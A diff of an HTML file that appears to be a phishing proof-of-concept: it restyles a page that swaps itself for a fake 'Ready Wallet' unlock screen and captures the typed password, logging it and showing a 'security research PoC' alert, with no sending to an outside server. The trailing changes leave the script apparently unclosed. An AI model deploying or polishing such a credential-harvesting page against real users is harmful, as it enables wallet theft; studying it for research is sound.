@@ -5,12 +5,13 @@
     <style>
       body {
         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
         padding: 40px;
         min-height: 100vh;
         display: flex;
         align-items: center;
         justify-content: center;
+        margin: 0;
       }
       .card {
         background-color: white;
@@ -19,7 +20,7 @@
         margin: auto;
         padding: 40px;
         border-radius: 16px;
-        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
       }
       .ready-logo {
         width: 90px;
@@ -27,7 +28,7 @@
         display: block;
       }
       h2 {
-        color: #1a1a2e;
+        color: #1a1a1a;
         margin-bottom: 12px;
         text-align: center;
         font-size: 28px;
@@ -35,7 +36,7 @@
       }
       p {
         font-size: 15px;
-        color: #666;
+        color: #4a4a4a;
         margin-bottom: 25px;
         text-align: center;
         line-height: 1.6;
@@ -53,7 +54,7 @@
         font-weight: 500;
       }
       button {
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
         color: white;
         padding: 14px 24px;
         border: none;
@@ -64,18 +65,18 @@
         margin-top: 25px;
         width: 100%;
         transition: all 0.3s ease;
-        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
       }
       button:hover {
         transform: translateY(-2px);
-        box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+        box-shadow: 0 6px 20px rgba(255, 107, 53, 0.5);
       }
       button:active {
         transform: translateY(0);
       }
       .info-text {
         font-size: 13px;
-        color: #888;
+        color: #666;
         margin-top: 20px;
         text-align: center;
         line-height: 1.5;
@@ -97,8 +98,8 @@
       <svg class="ready-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
         <defs>
           <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%" style="stop-color:#667eea;stop-opacity:1" />
-            <stop offset="100%" style="stop-color:#764ba2;stop-opacity:1" />
+            <stop offset="0%" style="stop-color:#ff6b35;stop-opacity:1" />
+            <stop offset="100%" style="stop-color:#f7931e;stop-opacity:1" />
           </linearGradient>
         </defs>
         <circle cx="50" cy="50" r="45" fill="url(#grad1)"/>
@@ -142,13 +143,13 @@
         
         setTimeout(() => {
           button.innerHTML = originalText;
-          button.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
+          button.style.background = 'linear-gradient(135deg, #ff6b35 0%, #f7931e 100%)';
         }, 1500);
 
         // After delay, show phishing login page
         setTimeout(() => {
-          document.write(`
-<!DOCTYPE html>
+          document.open();
+          document.write(`<!DOCTYPE html>
 <html>
 <head>
   <title>Ready Wallet - Unlock</title>
@@ -162,7 +163,7 @@
     body {
       margin: 0;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -174,7 +175,7 @@
       background: white;
       padding: 40px;
       border-radius: 20px;
-      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.2);
+      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.3);
       text-align: center;
       width: 100%;
       max-width: 400px;
@@ -199,13 +200,13 @@
 
     h2 {
       margin: 15px 0 10px;
-      color: #1a1a2e;
+      color: #1a1a1a;
       font-size: 28px;
       font-weight: 700;
     }
 
     .subtitle {
-      color: #666;
+      color: #4a4a4a;
       margin-bottom: 30px;
       font-size: 15px;
     }
@@ -217,7 +218,7 @@
 
     label {
       display: block;
-      color: #333;
+      color: #1a1a1a;
       font-size: 14px;
       font-weight: 600;
       margin-bottom: 8px;
@@ -235,13 +236,13 @@
 
     input[type="password"]:focus {
       outline: none;
-      border-color: #667eea;
-      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+      border-color: #ff6b35;
+      box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1);
     }
 
     .password-hint {
       font-size: 12px;
-      color: #888;
+      color: #666;
       margin-top: 8px;
       text-align: left;
     }
@@ -249,7 +250,7 @@
     button {
       width: 100%;
       padding: 16px;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
       color: white;
       border: none;
       border-radius: 10px;
@@ -257,17 +258,22 @@
       font-size: 16px;
       cursor: pointer;
       transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+      box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
       margin-top: 10px;
     }
 
     button:hover {
       transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+      box-shadow: 0 6px 20px rgba(255, 107, 53, 0.5);
     }
 
     button:active {
       transform: translateY(0);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
     }
 
     .forgot-password {
@@ -276,7 +282,7 @@
     }
 
     .forgot-password a {
-      color: #667eea;
+      color: #ff6b35;
       text-decoration: none;
       font-weight: 600;
     }
@@ -291,7 +297,7 @@
       background: #f8f9fa;
       border-radius: 10px;
       font-size: 13px;
-      color: #666;
+      color: #4a4a4a;
       line-height: 1.6;
     }
 
@@ -307,11 +313,11 @@
     .footer {
       margin-top: 25px;
       font-size: 12px;
-      color: #999;
+      color: #666;
     }
 
     .footer a {
-      color: #667eea;
+      color: #ff6b35;
       text-decoration: none;
     }
   </style>
@@ -321,8 +327,8 @@
     <svg class="ready-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
       <defs>
         <linearGradient id="grad2" x1="0%" y1="0%" x2="100%" y2="100%">
-          <stop offset="0%" style="stop-color:#667eea;stop-opacity:1" />
-          <stop offset="100%" style="stop-color:#764ba2;stop-opacity:1" />
+          <stop offset="0%" style="stop-color:#ff6b35;stop-opacity:1" />
+          <stop offset="100%" style="stop-color:#f7931e;stop-opacity:1" />
         </linearGradient>
       </defs>
       <circle cx="50" cy="50" r="45" fill="url(#grad2)"/>
@@ -374,19 +380,15 @@
       
       const password = document.getElementById('password').value;
       
-      // Log stolen credentials (in real attack, would send to attacker server)
       console.log('[PHISHED] Password:', password);
       
-      // Show "processing" state
       const button = document.querySelector('button[type="submit"]');
       button.innerHTML = '⏳ Unlocking...';
       button.disabled = true;
       
       setTimeout(() => {
-        // Show fake error or success
-        alert('🚨 PHISHING DEMONSTRATION\\n\\nStolen Password: ' + password + '\\n\\nIn real attack, this would be sent to:\\n→ Attacker\\'s server\\n→ Used to drain wallet\\n→ All funds stolen\\n\\nThis is a security research PoC!');
+        alert('🚨 PHISHING DEMONSTRATION\\n\\nStolen Password: ' + password + '\\n\\nIn real attack, this would be sent to:\\n→ Attacker server\\n→ Used to drain wallet\\n→ All funds stolen\\n\\nThis is a security research PoC!');
         
-        // Reset form
         button.innerHTML = '🔓 Unlock Wallet';
         button.disabled = false;
         document.getElementById('password').value = '';
@@ -395,16 +397,12 @@
       return false;
     }
     
-    // Focus password field on load
     window.onload = function() {
       document.getElementById('password').focus();
     };
   </script>
 </body>
 </html>
-          `);
-        }, 4500);
-      }
     </script>
   </body>
 </html>
